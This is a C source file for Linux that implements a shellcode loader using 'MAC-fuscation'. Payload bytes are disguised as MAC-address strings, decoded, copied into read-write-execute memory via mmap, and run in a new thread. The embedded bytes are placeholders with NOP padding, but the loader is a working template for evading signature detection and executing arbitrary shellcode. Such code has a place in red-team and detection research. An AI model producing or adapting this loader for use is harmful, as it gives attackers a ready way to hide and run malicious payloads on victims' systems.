#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <unistd.h>
#include <pthread.h>

// MAC address to binary decoder for Linux
int parse_mac_string(const char* mac_str, unsigned char* output) {
    unsigned int bytes[6];
    if (sscanf(mac_str, "%2x-%2x-%2x-%2x-%2x-%2x",
               &bytes[0], &bytes[1], &bytes[2],
               &bytes[3], &bytes[4], &bytes[5]) != 6) {
        return -1;
    }
    for (int i = 0; i < 6; i++) {
        output[i] = (unsigned char)bytes[i];
    }
    return 0;
}

int decode_mac_fuscation(const char* mac[], unsigned char* output, int count) {
    int offset = 0;

    for (int i = 0; i < count; i++) {
        if (parse_mac_string(mac[i], output + offset) != 0) {
            fprintf(stderr, "Failed to convert: %s\n", mac[i]);
            return -1;
        }
        offset += 6;
    }
    return 0;
}

const char* MACShell[] = {
    "01-02-03-04-05-06", "07-08-09-0A-0B-0C", "0D-0E-0F-10-11-12", "13-14-15-16-17-18", "19-1A-1B-1C-1D-1E", "1F-20-90-90-90-90"
    
};

#define ELEMENTS_COUNT 6
#define SHELLCODE_SIZE 36

int main() {
    unsigned char shellcode[SHELLCODE_SIZE];
    void* exec_mem;
    pthread_t thread;

    printf("[*] Decoding MAC shellcode...\n");
    if (decode_mac_fuscation(MACShell, shellcode, ELEMENTS_COUNT) != 0) {
        return -1;
    }

    exec_mem = mmap(NULL, SHELLCODE_SIZE,
                    PROT_READ | PROT_WRITE | PROT_EXEC,
                    MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);

    if (exec_mem == MAP_FAILED) {
        perror("mmap failed");
        return -1;
    }

    memcpy(exec_mem, shellcode, SHELLCODE_SIZE);
    printf("[+] Shellcode at: %p\n", exec_mem);

    pthread_create(&thread, NULL, (void*(*)(void*))exec_mem, NULL);
    printf("[+] Press Enter to exit...\n");
    getchar();

    munmap(exec_mem, SHELLCODE_SIZE);
    return 0;
}
